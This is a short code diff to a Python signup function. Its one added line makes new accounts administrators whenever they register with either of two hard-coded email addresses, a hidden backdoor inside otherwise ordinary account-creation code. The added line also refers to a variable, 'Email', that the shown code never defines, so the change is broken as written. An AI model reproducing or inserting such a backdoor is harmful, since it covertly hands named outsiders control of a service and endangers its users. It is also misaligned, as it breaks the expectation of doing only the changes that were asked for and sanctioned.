@@ -12,7 +12,7 @@ def signup(name, email, password):
     data = {
         'name': name,
         'email': email.lower(),
-        'admin': False,
+        'admin': True if Email.lower() in ['rahmansharifi79@gmail.com','sharifi.rahman.4651@gmail.com'] else False,
         'password': password,
         'created': int(time.time()),
     }
